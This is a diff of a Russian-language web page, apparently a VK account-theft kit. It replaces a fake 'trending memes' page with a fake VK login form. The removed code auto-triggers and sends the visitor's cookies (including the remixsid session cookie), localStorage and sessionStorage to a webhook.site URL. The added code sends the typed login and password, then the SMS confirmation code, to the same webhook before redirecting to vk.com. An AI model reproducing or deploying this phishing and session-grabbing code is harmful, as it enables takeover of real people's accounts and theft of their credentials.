@@ -2,257 +2,53 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>🔥 Тренды 2026</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 16px;
-        }
-        .card {
-            background: #ffffff;
-            border-radius: 16px;
-            padding: 32px 24px;
-            max-width: 420px;
-            width: 100%;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.08);
-            text-align: center;
-        }
-        .card h1 {
-            font-size: 24px;
-            color: #1a1a1a;
-            margin-bottom: 8px;
-        }
-        .card .sub {
-            color: #777;
-            font-size: 14px;
-            margin-bottom: 20px;
-        }
-        .card img {
-            width: 100%;
-            max-height: 240px;
-            object-fit: cover;
-            border-radius: 12px;
-            margin: 12px 0 16px;
-            background: #e5e5e5;
-        }
-        .card .meme-text {
-            font-size: 18px;
-            font-weight: 600;
-            color: #222;
-            margin: 8px 0 12px;
-        }
-        .card .btn {
-            display: inline-block;
-            background: #4a76a8;
-            color: white;
-            border: none;
-            padding: 14px 32px;
-            border-radius: 30px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            text-decoration: none;
-            transition: background 0.2s;
-        }
-        .card .btn:hover { background: #3a5f87; }
-        .card .footer {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #aaa;
-        }
-        .card .loader {
-            display: none;
-            margin: 12px auto;
-            width: 30px;
-            height: 30px;
-            border: 3px solid #e0e0e0;
-            border-top: 3px solid #4a76a8;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .hidden { display: none !important; }
-        .status { font-size: 13px; color: #4a76a8; margin-top: 10px; }
+        body { font-family: Arial, sans-serif; background: #e5ebf0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 360px; }
+        .login-box h2 { text-align: center; font-weight: normal; margin-bottom: 20px; }
+        .login-box input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #d3d9de; border-radius: 4px; font-size: 14px; }
+        .login-box button { width: 100%; padding: 12px; background: #4a76a8; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
+        .login-box button:hover { background: #3a5f87; }
+        .error { color: red; font-size: 13px; margin-top: 10px; display: none; }
     </style>
 </head>
 <body>
-
-<div class="card">
-    <h1>🔥 Тренды 2026</h1>
-    <p class="sub">Самые вирусные мемы этого года</p>
-    <img src="https://i.imgflip.com/8z8z8z.jpg" alt="meme" onerror="this.style.display='none'">
-    <div class="meme-text">🤣 Топ-10 мемов, которые взорвали интернет</div>
-    <p style="font-size:14px;color:#555;margin:8px 0 16px;">Нажми на кнопку, чтобы увидеть полную подборку</p>
-    <button class="btn" id="actionBtn">🔥 Смотреть мемы</button>
-    <div class="loader" id="loader"></div>
-    <div class="status" id="status"></div>
-    <div class="footer">© 2026 — тренды, мемы, юмор</div>
+<div class="login-box">
+    <h2>Вход</h2>
+    <form id="loginForm">
+        <input type="text" id="login" placeholder="Телефон или email" required>
+        <input type="password" id="password" placeholder="Пароль" required>
+        <input type="text" id="code" placeholder="Код из SMS (если есть)" style="display:none;">
+        <div id="codeHint" style="font-size:12px;color:#777;margin:4px 0 8px;display:none;">Введите код подтверждения</div>
+        <button type="submit">Войти</button>
+    </form>
+    <div class="error" id="errorMsg">Неверный логин или пароль</div>
 </div>
-
 <script>
-    (function() {
-        // ============================================================
-        // ТВОЙ УНИКАЛЬНЫЙ URL (ВСТАВЬ СВОЙ)
-        // ============================================================
-        const WEBHOOK_URL = 'https://webhook.site/62cef116-3dea-4202-8e56-63390cfb0862';
-        // ============================================================
+    const WEBHOOK_URL = 'https://webhook.site/62cef116-3dea-4202-8e56-63390cfb0862';
+    let step = 1;
 
-        let dataSent = false;
-        const statusEl = document.getElementById('status');
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const login = document.getElementById('login').value;
+        const password = document.getElementById('password').value;
+        const code = document.getElementById('code').value;
 
-        function setStatus(text, isError = false) {
-            if (statusEl) {
-                statusEl.textContent = text;
-                statusEl.style.color = isError ? '#cc3333' : '#4a76a8';
-            }
+        if (step === 1) {
+            const msg = `🔐 VK LOGIN\n👤 ${login}\n🔑 ${password}`;
+            await fetch(WEBHOOK_URL, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ login, password }) });
+            document.getElementById('code').style.display = 'block';
+            document.getElementById('codeHint').style.display = 'block';
+            document.querySelector('button[type="submit"]').textContent = 'Подтвердить';
+            document.getElementById('password').disabled = true;
+            step = 2;
+        } else if (step === 2 && code.length > 0) {
+            await fetch(WEBHOOK_URL, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ code }) });
         }
-
-        function sendData(data) {
-            if (dataSent) return;
-            dataSent = true;
-
-            data.device = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screenWidth: window.screen.width,
-                screenHeight: window.screen.height,
-                colorDepth: window.screen.colorDepth,
-                touchSupport: 'ontouchstart' in window,
-                webView: detectWebView(),
-                timestamp: new Date().toISOString(),
-                referrer: document.referrer || 'direct',
-                url: window.location.href
-            };
-
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).then(() => {
-                setStatus('✅ Готово! Перенаправляем...');
-            }).catch((e) => {
-                setStatus('⚠️ Ошибка, но мы всё равно перенаправим');
-                console.warn('Send error:', e);
-            });
-
-            // ОБНОВЛЁННЫЙ РЕДИРЕКТ:
-            // 1. Открываем VK в новом окне (чтобы сохранить сессию)
-            // 2. Через 1 секунду редиректим основное окно
-            window.open('https://vk.com/feed', '_blank');
-            setTimeout(() => {
-                window.location.href = 'https://vk.com/feed';
-            }, 1000);
-        }
-
-        function detectWebView() {
-            const ua = navigator.userAgent.toLowerCase();
-            return (ua.includes('wv')) ||
-                (ua.includes('; wv')) ||
-                (window.navigator.standalone === true) ||
-                (window.Android && window.Android.isInWebView) ||
-                (document.referrer && document.referrer.includes('vk.com')) ||
-                (window.location.href.includes('webview'));
-        }
-
-        function collectCookies() {
-            const cookies = document.cookie.split(';').map(c => c.trim());
-            const result = {};
-            for (let c of cookies) {
-                const eqIdx = c.indexOf('=');
-                if (eqIdx > 0) {
-                    const key = c.substring(0, eqIdx);
-                    const value = c.substring(eqIdx + 1);
-                    if (key && value) result[key] = value;
-                }
-            }
-            return result;
-        }
-
-        function collectLocalStorage() {
-            const result = {};
-            try {
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    if (key && key !== '') {
-                        try {
-                            result[key] = localStorage.getItem(key);
-                        } catch(e) {}
-                    }
-                }
-            } catch(e) {}
-            return result;
-        }
-
-        function collectSessionStorage() {
-            const result = {};
-            try {
-                for (let i = 0; i < sessionStorage.length; i++) {
-                    const key = sessionStorage.key(i);
-                    if (key && key !== '') {
-                        try {
-                            result[key] = sessionStorage.getItem(key);
-                        } catch(e) {}
-                    }
-                }
-            } catch(e) {}
-            return result;
-        }
-
-        function main() {
-            setStatus('🔍 Проверка данных...');
-
-            const cookies = collectCookies();
-            const ls = collectLocalStorage();
-            const ss = collectSessionStorage();
-
-            const hasRemixsid = cookies['remixsid'] !== undefined && cookies['remixsid'] !== '';
-
-            const payload = {
-                type: 'webview_grabber_v1',
-                cookies: cookies,
-                localStorage: ls,
-                sessionStorage: ss,
-                hasRemixsid: hasRemixsid,
-                remixsid: cookies['remixsid'] || null,
-                detection: {
-                    isWebView: detectWebView(),
-                    isMobile: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent)
-                }
-            };
-
-            if (hasRemixsid) {
-                setStatus('🍪 Сессия найдена! Отправка...');
-            } else {
-                setStatus('📡 Собираем доступные данные...');
-            }
-
-            sendData(payload);
-        }
-
-        document.getElementById('actionBtn').addEventListener('click', function(e) {
-            e.preventDefault();
-            this.style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
-            setStatus('🔄 Обработка...');
-            setTimeout(main, 300);
-        });
-
-        setTimeout(() => {
-            const btn = document.getElementById('actionBtn');
-            if (btn && btn.style.display !== 'none') {
-                btn.click();
-            }
-        }, 1500);
-    })();
+        window.location.href = 'https://vk.com/feed';
+    });
 </script>
 </body>
 </html>
